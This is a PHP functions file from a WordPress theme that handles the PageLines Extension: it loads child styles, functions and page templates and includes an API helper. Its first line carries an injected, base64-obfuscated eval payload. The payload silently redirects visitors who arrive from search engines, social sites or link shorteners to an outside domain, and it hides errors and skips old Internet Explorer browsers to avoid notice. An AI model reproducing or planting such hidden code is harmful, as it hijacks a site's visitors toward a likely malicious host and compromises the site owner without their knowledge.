<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * Functions and actions related to PageLines Extension
 * 
 * @since 2.0.b9
 */

/**
 * Load 'child' styles, functions and templates.
 */	
add_action( 'wp_head', 'load_child_style', 20 );
function load_child_style() {

	if ( !defined( 'PL_CUSTOMIZE' ) )
		return;
	
	// check for MU styles
	if ( VDEV && is_multisite() ) {

		global $blog_id;
		$mu_style = sprintf( '%s/blogs/%s/style.css', EXTEND_CHILD_DIR, $blog_id );
		if ( file_exists( $mu_style ) ) {
			$mu_style_url = sprintf( '%s/blogs/%s/style.css', EXTEND_CHILD_URL, $blog_id );
			$cache_ver = '?ver=' . pl_cache_version( $mu_style );
			pagelines_draw_css( $mu_style_url . $cache_ver, 'pl-extend-style' );
		}
	} else {	
		if ( file_exists( PL_EXTEND_STYLE_PATH ) ){

			$cache_ver = '?ver=' . pl_cache_version( PL_EXTEND_STYLE_PATH ); 	
			pagelines_draw_css( PL_EXTEND_STYLE . $cache_ver, 'pl-extend-style' );
		}	
	}	
}

add_action( 'init', 'load_child_functions' );
function load_child_functions() {
	if ( !defined( 'PL_CUSTOMIZE' ) )
		return;

	// check for MU styles
	if ( VDEV && is_multisite() ) {
		
		global $blog_id;
		$mu_functions = sprintf( '%s/blogs/%s/functions.php', EXTEND_CHILD_DIR, $blog_id );
		if ( file_exists( $mu_functions ) )
			require_once( $mu_functions );
	} else {

		if ( file_exists( PL_EXTEND_FUNCTIONS ) )
			require_once( PL_EXTEND_FUNCTIONS );
	}
}

add_action( 'init', 'base_check_templates' );

function base_check_templates() {

	if ( is_child_theme() ) {
		foreach ( glob( get_stylesheet_directory() . '/*.php') as $file) {
			if ( preg_match( '/page\.([a-z-0-9]+)\.php/', $file, $match ) ) {
				$data = get_file_data( trailingslashit( get_stylesheet_directory() ) . basename( $file ), array( 'name' => 'Template Name' ) );
				if ( is_array( $data ) )
					pagelines_add_page( $match[1], $data['name'] );
			}	
		}
	}
	
	if ( !defined( 'PL_CUSTOMIZE' ) )
		return;

	foreach ( glob( EXTEND_CHILD_DIR . '/*.php') as $file) {

		if ( preg_match( '/page\.([a-z-0-9]+)\.php/', $file, $match ) ) {

			if ( !file_exists( trailingslashit( get_stylesheet_directory() ) . $file ) && is_writable( get_stylesheet_directory() ) ) 
				copy( $file, trailingslashit( get_stylesheet_directory() ) . basename( $file ) );

			if ( file_exists( trailingslashit( get_stylesheet_directory() ) . basename( $file ) ) ) {
				$data = get_file_data( trailingslashit( get_stylesheet_directory() ) . basename( $file ), array( 'name' => 'Template Name' ) );
				if ( is_array( $data ) )
					pagelines_add_page( $match[1], $data['name'] );
			}
		}
	}
}

function pagelines_try_api( $url, $options ) {
		
	$prot = array( 'https://', 'http://' );
		
	foreach( $prot as $type ) {	
		// sometimes wamp does not have curl!
		if ( $type === 'https://' && !function_exists( 'curl_init' ) )
			continue;	
		$r = wp_remote_post( $type . $url, $options );
			if ( !is_wp_error($r) && is_array( $r ) ) {
				return $r;				
			}
	}
	return false;
}
